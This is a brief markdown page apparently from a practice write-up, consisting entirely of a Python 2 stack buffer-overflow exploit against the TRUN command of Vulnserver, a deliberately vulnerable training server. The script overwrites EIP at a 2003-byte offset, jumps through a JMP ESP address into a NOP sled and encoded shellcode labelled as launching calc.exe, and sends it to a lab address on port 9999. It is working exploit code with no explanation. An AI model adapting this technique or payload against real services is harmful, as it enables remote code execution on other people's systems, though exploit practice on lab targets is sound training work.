## Exploiting Vulnserver
```python 
#!/usr/bin/python
# Tested on Microsoft Windows 7 Enterprise

import socket

buf = "TRUN /.:/"
buf += "\x41" * 2003 # EIP 386F4337
buf += "\xaf\x11\x50\x62" #JMP ESP 
buf += "\x90" * 30 #NOP Sledges
buf += ("\xda\xd5\xb8\x7d\xb3\x4c\x5e\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x31\x31\x47\x18\x83\xc7\x04\x03\x47\x69\x51\xb9\xa2\x79\x17"
"\x42\x5b\x79\x78\xca\xbe\x48\xb8\xa8\xcb\xfa\x08\xba\x9e\xf6"
"\xe3\xee\x0a\x8d\x86\x26\x3c\x26\x2c\x11\x73\xb7\x1d\x61\x12"
"\x3b\x5c\xb6\xf4\x02\xaf\xcb\xf5\x43\xd2\x26\xa7\x1c\x98\x95"
"\x58\x29\xd4\x25\xd2\x61\xf8\x2d\x07\x31\xfb\x1c\x96\x4a\xa2"
"\xbe\x18\x9f\xde\xf6\x02\xfc\xdb\x41\xb8\x36\x97\x53\x68\x07"
"\x58\xff\x55\xa8\xab\x01\x91\x0e\x54\x74\xeb\x6d\xe9\x8f\x28"
"\x0c\x35\x05\xab\xb6\xbe\xbd\x17\x47\x12\x5b\xd3\x4b\xdf\x2f"
"\xbb\x4f\xde\xfc\xb7\x6b\x6b\x03\x18\xfa\x2f\x20\xbc\xa7\xf4"
"\x49\xe5\x0d\x5a\x75\xf5\xee\x03\xd3\x7d\x02\x57\x6e\xdc\x48"
"\xa6\xfc\x5a\x3e\xa8\xfe\x64\x6e\xc1\xcf\xef\xe1\x96\xcf\x25"
"\x46\x68\x9a\x64\xee\xe1\x43\xfd\xb3\x6f\x74\x2b\xf7\x89\xf7"
"\xde\x87\x6d\xe7\xaa\x82\x2a\xaf\x47\xfe\x23\x5a\x68\xad\x44"
"\x4f\x0b\x30\xd7\x13\xe2\xd7\x5f\xb1\xfa") #calc.exe

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.104',9999)) # connect to FTP Server
s.send(buf + '\r\n') 
response = s.recv(1024)
s.close()
```





